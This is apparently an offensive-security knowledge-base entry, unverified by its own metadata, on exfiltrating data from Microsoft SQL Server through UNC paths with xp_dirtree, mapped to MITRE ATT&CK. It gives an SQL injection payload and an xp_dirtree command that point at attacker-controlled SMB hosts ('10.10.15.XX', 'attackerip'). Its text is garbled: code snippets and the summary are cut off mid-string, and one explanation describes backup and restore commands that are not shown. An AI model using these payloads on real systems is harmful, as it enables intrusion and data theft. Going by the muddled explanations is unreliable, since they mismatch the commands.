---
id: 71630a0d-9ebd-40c9-b155-fa4c0de8aff8
name: MSSQL UNC Path Out-of-Band Data Retrieval
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:34.044518+00:00'
updated_at: '2023-04-10T20:22:39.028227+00:00'
tactics:
- '[[Discovery|TA0007 - Discovery]]'
- '[[Exfiltration|TA0010 - Exfiltration]]'
techniques:
- '[[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative
  Protocol]]'
- '[[Query Registry|T1012 - Query Registry]]'
tags:
- '[[MSSQL Injection]]'
- '[[MSSQL Out of band]]'
- '[[MSSQL UNC Path]]'
commands:
- '[[List all files and folders in directory]]'
---

# MSSQL UNC Path Out-of-Band Data Retrieval

## Summary

MSSQL UNC Path Out-of-Band Data Retrieval is a technique used to exfiltrate data from a MSSQL database through the use of UNC paths. This technique is useful when direct outbound connections are blocked by a firewall, but outbound SMB connections are allowed. The attacker can use the 'XP Dirtree En

## Description

# Description

MSSQL UNC Path Out-of-Band Data Retrieval is a technique used to exfiltrate data from a MSSQL database through the use of UNC paths. This technique is useful when direct outbound connections are blocked by a firewall, but outbound SMB connections are allowed. The attacker can use the 'XP Dirtree Enumeration' and 'List Files on Remote Share' commands to traverse the file system and exfiltrate data. This technique can be used to bypass network segmentation and exfiltrate data from a secure network.

To execute this attack, the attacker must first gain access to the MSSQL database through a SQL Injection vulnerability. Once access is gained, the attacker can use the 'Windows SQL Server Commands' to execute the 'XP Dirtree Enumeration' and 'List Files on Remote Share' commands. The attacker can then use the output of these commands to exfiltrate data through SMB.

This technique can be used to steal sensitive data such as credentials, intellectual property, and customer data. It can also be used to perform reconnaissance on the target network.

 

## Requirements

1. Access to a MSSQL database through a SQL Injection vulnerability

1. Outbound SMB connections allowed

 

## Defense

1. Implement proper input validation to prevent SQL Injection vulnerabilities

1. Block outbound SMB connections at the firewall

1. Monitor network traffic for suspicious activity such as large amounts of data being transferred over SMB

 

## Objectives

1. Exfiltrate sensitive data from a MSSQL database

1. Bypass network segmentation

1. Perform reconnaissance on the target network

 

# Instructions

1. The xp_dirtree command in MSSQL is used to enumerate the directory structure of a specified path. It takes two arguments: the first argument is the path to the directory you want to enumerate and the second argument is the depth of the enumeration. 

 



**Code**: [[xp_dirtree]]



> To use this command, you must have the necessary permissions to execute it. Once executed, the command will return a table with the directory structure of the specified path. This information can be useful for reconnaissance purposes and can help identify potential targets for further exploitation.



**Command** ([[List all files and folders in directory]]):

```bash
xp_dirtree <directory>
```



2. To list files on a remote share, run this SQL command. Make sure to replace '10.10.15.XX' with the IP address of the remote machine and 'SHARE' with the name of the shared folder.

 



**Code**: [[1'; use master; exec xp_dirtree '\\10.10.15.XX\SHA]]



> This command executes the 'xp_dirtree' extended stored procedure which lists the contents of a directory. The '\\10.10.15.XX\SHARE' argument specifies the remote share to list files from. The '--' at the end of the command is a comment that ignores the rest of the SQL statement, preventing any errors that may occur.

3. Please execute these commands with caution as they can potentially cause data loss or corruption.

 



**Code**: [[xp_dirtree '\\attackerip\file'

This command retur]]



> The provided commands are used to perform various backup and restore operations on a SQL Server database. The xp_dirtree and xp_fileexist commands are used to check for the existence of a file or directory on a remote server. The BACKUP and RESTORE commands are used to create and restore backups of a database or transaction log. The RESTORE HEADERONLY, RESTORE FILELISTONLY, RESTORE LABELONLY, RESTORE REWINDONLY, and RESTORE VERIFYONLY commands are used to retrieve information about a backup file or to perform certain operations on the backup file.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery|TA0007 - Discovery]]
- [[Exfiltration|TA0010 - Exfiltration]]

### Techniques

- [[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative Protocol]]
- [[Query Registry|T1012 - Query Registry]]

## Commands Used

- [[List all files and folders in directory]]

## Tags

- [[MSSQL Injection]]
- [[MSSQL Out of band]]
- [[MSSQL UNC Path]]


